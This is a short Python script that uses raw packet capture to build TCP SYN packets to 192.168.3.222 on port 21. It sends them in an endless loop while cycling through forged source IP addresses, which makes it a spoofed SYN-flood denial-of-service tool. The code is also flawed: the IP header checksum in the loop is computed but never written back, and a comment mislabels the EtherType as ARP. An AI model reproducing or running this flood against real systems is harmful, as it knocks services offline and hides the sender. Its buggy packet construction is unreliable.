from winpcapy import *
from dumpy import *
import struct
import time

def makeCheckSum(data):
    size = len(data)
    if size % 2:
        data+= b'\x00'
        size += 1

    data = struct.unpack("!" + str(size // 2) + "H", data)
    chk = 0
    for x in data:
        chk += x
    chk = (chk >> 16) + (chk & 0xffff)
    chk = chk ^ 0xffff
    return chk

packet = (c_ubyte * 54)()

device = get_device()
adhandle = pcap_open_live( device.name, 65536, 1, 1000, errbuf )

# dst mac address
packet[0], packet[1], packet[2], packet[3], packet[4], packet[5] = \
           0x00, 0x0c, 0x29, 0x38, 0xf1, 0xc2

# src mac address
packet[6], packet[7], packet[8], packet[9], packet[10], packet[11] = \
           0x90, 0x9f, 0x33, 0xeb, 0x3b, 0xa5

# ethernet type(ARP/0x0806)
packet[12], packet[13] = 0x08, 0x00

# ip ver & len
packet[14] = 0x45

# service 
packet[15] = 0x00

# total
packet[16], packet[17] = 0x00, 0x28
                         
# identification
packet[18], packet[19] = 0x12, 0x34
                         
# flag & fragment offset
packet[20], packet[21] = 0x00, 0x00

# ttl
packet[22] = 128

# ip type
packet[23] = 6

# checksum
packet[24], packet[25] = 0x00, 0x00

# src ip
packet[26], packet[27], packet[28], packet[29] = \
            192, 168, 3, 214

# dst ip
packet[30], packet[31], packet[32], packet[33] = \
            192, 168, 3, 222

packetBytes = bytes(packet[14: 34])
chkSum = makeCheckSum(packetBytes)
chkSum0 = chkSum & 0xff
chkSum1 = (chkSum >> 8) & 0xff

packet[24] = chkSum1
packet[25] = chkSum0

#tcp src port
packet[34], packet[35] = 0x22, 0x22

#tcp dst port
packet[36], packet[37] = 0x00, 0x15

#seqence number
packet[38], packet[39], packet[40], packet[41] = 0x12, 0x34, 0x56, 0x78

#acknowledge number
packet[42], packet[43], packet[44], packet[45] = 0x00, 0x00, 0x00, 0x00

#tcp header length
packet[46] = 5 << 4

#tcp flag
packet[47] = 2

#tcp window size
packet[48], packet[49] = 0xff, 0xff

#tcp checksum
packet[50], packet[51] = 0x00, 0x00

#tcp dummy
packet[52], packet[53] = 0x00, 0x00

pseudo = []

pseudo = packet[26: 30] + packet[30: 34] + [0] + [packet[23]] + [0x00, 0x14] + packet[34: 54]

pseudoChkSum = makeCheckSum(bytes(pseudo))

pseudoChkSum0 = pseudoChkSum & 0xff
pseudoChkSum1 = (pseudoChkSum >> 8) & 0xff

packet[50] = pseudoChkSum1
packet[51] = pseudoChkSum0

a = 1
b = 1
c = 1
d = 1
import random
while True:
    d += 1
    if d == 255:
        d = 1
        c += 1

    if c == 255:
        c = 1
        b += 1

    if b == 255:
        b = 1
        a += 1

    if a == 255:
        a = 1
        b = 1
        c = 1
        d = 1
    
    packet[26], packet[27], packet[28], packet[29] = \
            a, b, c, d

    packet[24: 26] = 0, 0
    packetBytes = bytes(packet[14: 34])
    chkSum = makeCheckSum(packetBytes)
    chkSum0 = chkSum & 0xff
    chkSum1 = (chkSum >> 8) & 0xff

    packet[50: 52] = 0, 0
    pseudo = packet[26: 30] + packet[30: 34] + [0] + [packet[23]] + [0x00, 0x14] + packet[34: 54]
    pseudoChkSum = makeCheckSum(bytes(pseudo))

    pseudoChkSum0 = pseudoChkSum & 0xff
    pseudoChkSum1 = (pseudoChkSum >> 8) & 0xff

    packet[50] = pseudoChkSum1
    packet[51] = pseudoChkSum0
    
    pcap_sendpacket(adhandle, packet, 54)

pcap_close(adhandle)
